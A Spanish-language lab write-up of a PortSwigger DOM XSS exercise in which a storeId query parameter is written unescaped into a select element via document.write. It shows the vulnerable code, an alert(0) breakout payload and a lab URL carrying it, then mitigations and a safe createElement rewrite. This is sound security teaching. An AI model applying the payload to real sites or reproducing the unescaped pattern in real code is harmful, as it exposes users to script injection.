
---

# DOM XSS en `document.write` dentro de un elemento `<select>`

## Contexto del laboratorio

- Laboratorio: DOM XSS in document.write sink using source location.search inside a select element.
    
- Descripción: existe una vulnerabilidad de Cross-Site Scripting basada en DOM en la funcionalidad de comprobación de stock. Se utiliza `document.write` para escribir datos controlados por el usuario directamente en la página. La información proviene de `location.search` (la query string de la URL) y se coloca dentro de un `<select>`.
    
- Objetivo: realizar un ataque XSS que rompa el `<select>` y ejecute `alert(0)`.
    

[Ver laboratorio Portswigger](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)

## Código vulnerable observado

```js
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

- La vulnerabilidad radica en que `store` proviene directamente de `location.search` y se concatena sin escapado dentro de `document.write`. Esto permite romper la estructura del `<select>` y ejecutar código JavaScript.
    

## Ejemplo de URL con payload que explota la vulnerabilidad

```
https://0aad00f704c043da8027589f00c900bb.web-security-academy.net/product?productId=2&storeId=%3C/option%3E%3C/select%3E%3Cscript%3Ealert(0)%3C/script%3E
```

## Payload utilizado

```
</option></select><script>alert(0)</script>
```

## Cómo funciona el exploit

1. La query string `storeId` se inserta en la línea:
    

```js
document.write('<option selected>'+store+'</option>');
```

2. Al inyectar `</option></select><script>alert(0)</script>`:
    
    - `</option>` cierra la opción actual.
        
    - `</select>` cierra el select.
        
    - `<script>alert(0)</script>` se ejecuta inmediatamente en la página.
        
3. Como `document.write` escribe directamente en el DOM, la ejecución de `<script>` ocurre de inmediato al cargar la página.
    

## Pasos educativos para reproducir

1. Abrir la página del laboratorio con la URL que contiene el payload.
    
2. Inspeccionar la sección del `<select>` para observar cómo se ha roto la estructura y se ha inyectado el `<script>`.
    
3. Verificar que la alerta se dispara al cargar la página.
    

## Mitigaciones y soluciones

1. **No usar `document.write` con datos controlados por el usuario.**
    
    - En lugar de `document.write`, usar métodos seguros como `createElement`, `appendChild` o `textContent`.
        
2. **Escapar los datos antes de insertarlos en HTML.**
    
    - Por ejemplo, escapar `<`, `>`, `&`, `"`, `'` para que el contenido no pueda romper la estructura del HTML.
        
3. **Validación de parámetros.**
    
    - Permitir únicamente valores esperados en `storeId` (por ejemplo `London`, `Paris`, `Milan`) usando whitelist.
        
4. **Evitar concatenación directa en plantillas.**
    
    - Usar funciones que generen elementos DOM y asignen sus valores de forma segura.
        

## Ejemplo seguro de inserción de options

```js
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
var select = document.createElement('select');
select.name = 'storeId';

stores.forEach(function(s) {
    var option = document.createElement('option');
    option.textContent = s;
    if (s === store) {
        option.selected = true;
    }
    select.appendChild(option);
});

document.body.appendChild(select);
```

- En este ejemplo, `textContent` asegura que cualquier valor de `storeId` se inserta como texto, evitando XSS.
    

---
